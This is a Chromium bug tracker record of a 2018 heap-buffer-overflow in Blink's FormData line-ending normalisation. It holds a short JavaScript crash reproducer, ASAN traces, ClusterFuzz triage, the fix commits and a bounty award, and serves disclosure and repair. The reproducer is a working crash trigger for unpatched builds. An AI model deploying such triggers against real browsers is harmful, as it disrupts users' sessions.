# Heap-buffer-overflow in blink::NormalizeLineEndingsToCRLF

| Field | Value |
|-------|-------|
| **Issue ID** | [40091470](https://issues.chromium.org/issues/40091470) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P3 |
| **Component** | Blink>Forms |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | tk...@chromium.org |
| **Created** | 2018-05-25 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of content\_shell

**VERSION**  

Chrome Version: asan-linux-release-561018  

Operating System: Linux 64bit

**REPRODUCTION CASE**

<script>
o230=new FormData();
s63=unescape('%0D');
o230.append(s63,'undefined','undefined');
</script>
# Type of crash: tab Crash State: ASAN output:

==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200004211d at pc 0x00001000b686 bp 0x7ffc5bbe62d0 sp 0x7ffc5bbe62c8  

READ of size 1 at 0x60200004211d thread T0 (content\_shell)  

#0 0x1000b685 in NormalizeToCRLF<unsigned char> ./../../third\_party/blink/renderer/platform/text/line\_ending.cc:125:11  

#1 0x1000b685 in blink::NormalizeLineEndingsToCRLF(WTF::String const&) ./../../third\_party/blink/renderer/platform/text/line\_ending.cc:224:0  

#2 0x11bb6baa in Normalize ./../../third\_party/blink/renderer/core/html/forms/form\_data.cc:83:37  

#3 0x11bb6baa in blink::FormData::append(WTF::String const&, blink::Blob\*, WTF::String const&) ./../../third\_party/blink/renderer/core/html/forms/form\_data.cc:203:0  

#4 0xf65aa71 in blink::FormDataV8Internal::append2Method(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_form\_data.cc:120:9  

#5 0xf6508e1 in appendMethod ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_form\_data.cc:0:9  

#6 0xf6508e1 in blink::V8FormData::appendMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_form\_data.cc:415:0  

#7 0x5d60341 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo\*) ./../../v8/src/api-arguments-inl.h:94:3  

#8 0x5d5d4a8 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) ./../../v8/src/builtins/builtins-api.cc:109:36  

#9 0x5d5ac7b in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) ./../../v8/src/builtins/builtins-api.cc:139:5  

#7 0x7e80a7fda9dc (<unknown module>)  

#8 0x7e80a7f913d4 (<unknown module>)  

#9 0x7e80a7f8e9d4 (<unknown module>)  

#10 0x7e80a7f86960 (<unknown module>)  

#10 0x6748c6f in Call ./../../v8/src/simulator.h:113:12  

#11 0x6748c6f in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) ./../../v8/src/execution.cc:155:0  

#12 0x6748022 in CallInternal ./../../v8/src/execution.cc:191:10  

#13 0x6748022 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) ./../../v8/src/execution.cc:202:0  

#14 0x5baf94c in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) ./../../v8/src/api.cc:2180:7  

#15 0xf1a87c7 in blink::V8ScriptRunner::RunCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:425:22  

#16 0xf1fddf7 in blink::ScriptController::ExecuteScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::KURL const&, blink::ScriptFetchOptions const&, blink::AccessControlStatus) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:148:20  

#17 0xf200566 in blink::ScriptController::EvaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::ScriptFetchOptions const&, blink::AccessControlStatus, blink::ScriptController::ExecuteScriptPolicy) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:349:33  

#18 0xf200f4f in blink::ScriptController::ExecuteScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::ScriptFetchOptions const&, blink::AccessControlStatus) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:314:3  

#19 0x132130a6 in blink::ScriptLoader::ExecuteScriptBlock(blink::PendingScript\*, blink::KURL const&) ./../../third\_party/blink/renderer/core/script/script\_loader.cc:900:13  

#20 0x1320e4ca in blink::ScriptLoader::PrepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) ./../../third\_party/blink/renderer/core/script/script\_loader.cc:694:3  

#21 0x131bfbbb in blink::HTMLParserScriptRunner::ProcessScriptElementInternal(blink::Element\*, WTF::TextPosition const&) ./../../third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:511:20  

#22 0x131bf488 in blink::HTMLParserScriptRunner::ProcessScriptElement(blink::Element\*, WTF::TextPosition const&) ./../../third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:288:3  

#23 0x119cc8f5 in RunScriptsForPausedTreeBuilder ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:282:21  

#24 0x119cc8f5 in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::\_\_1::unique\_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::\_\_1::default\_delete[blink::HTMLDocumentParser::TokenizedChunk](javascript:void(0);) >) ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:538:0  

#25 0x119c7813 in blink::HTMLDocumentParser::PumpPendingSpeculations() ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:596:9  

#26 0x10070ddc in Run ./../../base/callback.h:96:12  

#27 0x10070ddc in blink::TaskHandle::Runner::Run(blink::TaskHandle const&) ./../../third\_party/blink/renderer/platform/web\_task\_runner.cc:75:0  

#28 0xa3688b9 in Run ./../../base/callback.h:96:12  

#29 0xa3688b9 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) ./../../base/debug/task\_annotator.cc:101:0  

#30 0x7aa030a in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) ./../../third\_party/blink/renderer/platform/scheduler/base/thread\_controller\_impl.cc:170:21  

#31 0xa3688b9 in Run ./../../base/callback.h:96:12  

#32 0xa3688b9 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) ./../../base/debug/task\_annotator.cc:101:0  

#33 0xa3d76d9 in base::MessageLoop::RunTask(base::PendingTask\*) ./../../base/message\_loop/message\_loop.cc:319:25  

#34 0xa3d8b9f in DeferOrRunPendingTask ./../../base/message\_loop/message\_loop.cc:329:5  

#35 0xa3d8b9f in base::MessageLoop::DoWork() ./../../base/message\_loop/message\_loop.cc:373:0  

#36 0xa3e266f in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ./../../base/message\_loop/message\_pump\_default.cc:37:31  

#37 0xa44b7ab in base::RunLoop::Run() ./../../base/run\_loop.cc:102:14  

#38 0x16e3e7e3 in content::RendererMain(content::MainFunctionParams const&) ./../../content/renderer/renderer\_main.cc:245:23  

#39 0x7efba51 in content::RunZygote(content::ContentMainDelegate\*) ./../../content/app/content\_main\_runner\_impl.cc:567:14  

#40 0x7f000d2 in content::ContentMainRunnerImpl::Run() ./../../content/app/content\_main\_runner\_impl.cc:969:10  

#41 0xefdeddc in service\_manager::Main(service\_manager::MainParams const&) ./../../services/service\_manager/embedder/main.cc:459:29  

#42 0x586df87 in content::ContentMain(content::ContentMainParams const&) ./../../content/app/content\_main.cc:19:10  

#43 0x33f7f77 in main ./../../content/shell/app/shell\_main.cc:48:10  

#44 0x7fec098e7b96 in \_\_libc\_start\_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310:0

0x60200004211d is located 0 bytes to the right of 13-byte region [0x602000042110,0x60200004211d)  

allocated by thread T0 (content\_shell) here:  

#0 0x33c9123 in \_\_interceptor\_malloc *asan\_rtl*:3  

#1 0xf0ab403 in PartitionAllocGenericFlags ./../../base/allocator/partition\_allocator/partition\_alloc.h:318:18  

#2 0xf0ab403 in Alloc ./../../base/allocator/partition\_allocator/partition\_alloc.h:338:0  

#3 0xf0ab403 in BufferMalloc ./../../third\_party/blink/renderer/platform/wtf/allocator/partitions.h:109:0  

#4 0xf0ab403 in WTF::StringImpl::CreateUninitialized(unsigned int, unsigned char\*&) ./../../third\_party/blink/renderer/platform/wtf/text/string\_impl.cc:115:0  

#5 0xfc41283 in CreateUninitialized ./../../third\_party/blink/renderer/platform/wtf/text/wtf\_string.h:355:12  

#6 0xfc41283 in FromV8String[blink::V8StringOneByteTrait](javascript:void(0);) ./../../third\_party/blink/renderer/platform/bindings/string\_resource.cc:59:0  

#7 0xfc41283 in WTF::String blink::V8StringToWebCoreString[WTF::String](javascript:void(0);)(v8::Local[v8::String](javascript:void(0);), blink::ExternalMode) ./../../third\_party/blink/renderer/platform/bindings/string\_resource.cc:105:0  

#8 0x9f04bd2 in ToString[WTF::String](javascript:void(0);) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_string\_resource.h:129:14  

#9 0x9f04bd2 in operator String ./../../third\_party/blink/renderer/bindings/core/v8/v8\_string\_resource.h:83:0  

#10 0x9f04bd2 in blink::NativeValueTraits<blink::IDLUSVStringBase<(blink::V8StringResourceMode)0>, void>::NativeValue(v8::Isolate\*, v8::Local[v8::Value](javascript:void(0);), blink::ExceptionState&) ./../../third\_party/blink/renderer/bindings/core/v8/native\_value\_traits\_impl.h:231:0  

#11 0xf65a392 in blink::FormDataV8Internal::append2Method(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_form\_data.cc:106:10  

#12 0xf6508e1 in appendMethod ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_form\_data.cc:0:9  

#13 0xf6508e1 in blink::V8FormData::appendMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_form\_data.cc:415:0  

#14 0x5d60341 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo\*) ./../../v8/src/api-arguments-inl.h:94:3  

#15 0x5d5d4a8 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) ./../../v8/src/builtins/builtins-api.cc:109:36  

#16 0x5d5ac7b in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) ./../../v8/src/builtins/builtins-api.cc:139:5  

#9 0x7e80a7fda9dc (<unknown module>)  

#10 0x7e80a7f913d4 (<unknown module>)  

#11 0x7e80a7f8e9d4 (<unknown module>)  

#12 0x7e80a7f86960 (<unknown module>)  

#17 0x6748c6f in Call ./../../v8/src/simulator.h:113:12  

#18 0x6748c6f in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) ./../../v8/src/execution.cc:155:0  

#19 0x6748022 in CallInternal ./../../v8/src/execution.cc:191:10  

#20 0x6748022 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) ./../../v8/src/execution.cc:202:0  

#21 0x5baf94c in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) ./../../v8/src/api.cc:2180:7  

#22 0xf1a87c7 in blink::V8ScriptRunner::RunCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:425:22  

#23 0xf1fddf7 in blink::ScriptController::ExecuteScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::KURL const&, blink::ScriptFetchOptions const&, blink::AccessControlStatus) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:148:20  

#24 0xf200566 in blink::ScriptController::EvaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::ScriptFetchOptions const&, blink::AccessControlStatus, blink::ScriptController::ExecuteScriptPolicy) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:349:33  

#25 0xf200f4f in blink::ScriptController::ExecuteScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::ScriptFetchOptions const&, blink::AccessControlStatus) ./../../third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:314:3  

#26 0x132130a6 in blink::ScriptLoader::ExecuteScriptBlock(blink::PendingScript\*, blink::KURL const&) ./../../third\_party/blink/renderer/core/script/script\_loader.cc:900:13  

#27 0x1320e4ca in blink::ScriptLoader::PrepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) ./../../third\_party/blink/renderer/core/script/script\_loader.cc:694:3  

#28 0x131bfbbb in blink::HTMLParserScriptRunner::ProcessScriptElementInternal(blink::Element\*, WTF::TextPosition const&) ./../../third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:511:20  

#29 0x131bf488 in blink::HTMLParserScriptRunner::ProcessScriptElement(blink::Element\*, WTF::TextPosition const&) ./../../third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:288:3  

#30 0x119cc8f5 in RunScriptsForPausedTreeBuilder ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:282:21  

#31 0x119cc8f5 in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::\_\_1::unique\_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::\_\_1::default\_delete[blink::HTMLDocumentParser::TokenizedChunk](javascript:void(0);) >) ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:538:0  

#32 0x119c7813 in blink::HTMLDocumentParser::PumpPendingSpeculations() ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:596:9  

#33 0x10070ddc in Run ./../../base/callback.h:96:12  

#34 0x10070ddc in blink::TaskHandle::Runner::Run(blink::TaskHandle const&) ./../../third\_party/blink/renderer/platform/web\_task\_runner.cc:75:0  

#35 0xa3688b9 in Run ./../../base/callback.h:96:12  

#36 0xa3688b9 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) ./../../base/debug/task\_annotator.cc:101:0  

#37 0x7aa030a in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) ./../../third\_party/blink/renderer/platform/scheduler/base/thread\_controller\_impl.cc:170:21  

#38 0xa3688b9 in Run ./../../base/callback.h:96:12  

#39 0xa3688b9 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) ./../../base/debug/task\_annotator.cc:101:0

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/nils/fuzzer3/dl/asan-linux-release-561018/content\_shell+0x1000b685)  

Shadow bytes around the buggy address:  

0x0c04800003d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c04800003e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c04800003f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0480000400: fa fa fd fa fa fa fd fa fa fa 00 00 fa fa fd fa  

0x0c0480000410: fa fa fd fa fa fa 00 07 fa fa fd fa fa fa fd fa  

=>0x0c0480000420: fa fa 00[05]fa fa 00 06 fa fa fa fa fa fa fa fa  

0x0c0480000430: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0480000440: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0480000450: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0480000460: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0480000470: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==1==ABORTING

## Timeline

### cl...@chromium.org (2018-05-25)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6691090430951424.

### cl...@chromium.org (2018-05-25)

Detailed report: https://clusterfuzz.com/testcase?key=6691090430951424

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x6090001daf5d
Crash State:
  blink::NormalizeLineEndingsToCRLF
  blink::FormData::append
  blink::FormDataV8Internal::append2Method
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=560504:560505

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6691090430951424

See https://github.com/google/clusterfuzz-tools for more information.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.


### cl...@chromium.org (2018-05-25)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/chromium/src/+/9902a56afc8e83cd5f37fdbb24d63f35dc849ee1 (FormData: Do not store encoded strings in FormData::Entry.).

If this is incorrect, please let us know why and apply the Test-Predator-Wrong-CLs label. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### sh...@chromium.org (2018-05-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-05-26)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-05-26)

[Empty comment from Monorail migration]

### tk...@chromium.org (2018-05-27)

Oops, a silly bug.


[Monorail components: Blink>Forms]

### tk...@chromium.org (2018-05-27)

This bug can cause at most:
 - 1 character out-of-bound read to check '\n' after '\r'
 - 1 character out-of-bound write to append '\n' if the above oob read was '\n'
I think it's very difficult to use this bug for actual attacks.


 

### bu...@chromium.org (2018-05-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/85c6d97f0245be418791ed651fb2888562dcbd70

commit 85c6d97f0245be418791ed651fb2888562dcbd70
Author: Kent Tamura <tkent@chromium.org>
Date: Mon May 28 02:32:58 2018

FormData: Fix a trailing '\r' handling.

Bug: 846635
Change-Id: Ie68a90cdb7e02137a927b95861231911ea232f3d
Reviewed-on: https://chromium-review.googlesource.com/1074770
Reviewed-by: Yoshifumi Inoue <yosin@chromium.org>
Commit-Queue: Kent Tamura <tkent@chromium.org>
Cr-Commit-Position: refs/heads/master@{#562164}
[modify] https://crrev.com/85c6d97f0245be418791ed651fb2888562dcbd70/third_party/blink/renderer/platform/BUILD.gn
[modify] https://crrev.com/85c6d97f0245be418791ed651fb2888562dcbd70/third_party/blink/renderer/platform/text/line_ending.cc
[add] https://crrev.com/85c6d97f0245be418791ed651fb2888562dcbd70/third_party/blink/renderer/platform/text/line_ending_test.cc


### cl...@chromium.org (2018-05-28)

ClusterFuzz has detected this issue as fixed in range 562163:562165.

Detailed report: https://clusterfuzz.com/testcase?key=6691090430951424

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x6090001daf5d
Crash State:
  blink::NormalizeLineEndingsToCRLF
  blink::FormData::append
  blink::FormDataV8Internal::append2Method
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=560504:560505
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=562163:562165

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6691090430951424

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2018-05-28)

ClusterFuzz testcase 6691090430951424 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2018-05-28)

[Empty comment from Monorail migration]

### tk...@chromium.org (2018-05-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-29)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-05-30)

Your change meets the bar and is auto-approved for M68. Please go ahead and merge the CL to branch 3440 manually. Please contact milestone owner if you have questions.
Owners: cmasso@(Android), kariahda@(iOS), bhthompson@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2018-05-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/1adeabcb78ae2fc513f37968b129ac69943e82cb

commit 1adeabcb78ae2fc513f37968b129ac69943e82cb
Author: Kent Tamura <tkent@chromium.org>
Date: Wed May 30 06:39:42 2018

Merge "FormData: Fix a trailing '\r' handling." to M68

Bug: 846635
Change-Id: Ie68a90cdb7e02137a927b95861231911ea232f3d
Reviewed-on: https://chromium-review.googlesource.com/1074770
Reviewed-by: Yoshifumi Inoue <yosin@chromium.org>
Commit-Queue: Kent Tamura <tkent@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#562164}(cherry picked from commit 85c6d97f0245be418791ed651fb2888562dcbd70)
Reviewed-on: https://chromium-review.googlesource.com/1077951
Reviewed-by: Kent Tamura <tkent@chromium.org>
Cr-Commit-Position: refs/branch-heads/3440@{#40}
Cr-Branched-From: 010ddcfda246975d194964ccf20038ebbdec6084-refs/heads/master@{#561733}
[modify] https://crrev.com/1adeabcb78ae2fc513f37968b129ac69943e82cb/third_party/blink/renderer/platform/BUILD.gn
[modify] https://crrev.com/1adeabcb78ae2fc513f37968b129ac69943e82cb/third_party/blink/renderer/platform/text/line_ending.cc
[add] https://crrev.com/1adeabcb78ae2fc513f37968b129ac69943e82cb/third_party/blink/renderer/platform/text/line_ending_test.cc


### aw...@chromium.org (2018-06-05)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-08)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-06-09)

$500 for this report, given difficulty of exploitation.

### aw...@google.com (2018-06-09)

[Empty comment from Monorail migration]

### mb...@chromium.org (2018-07-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-09-03)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2018-09-03)

This issue was migrated from crbug.com/chromium/846635?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091470)*
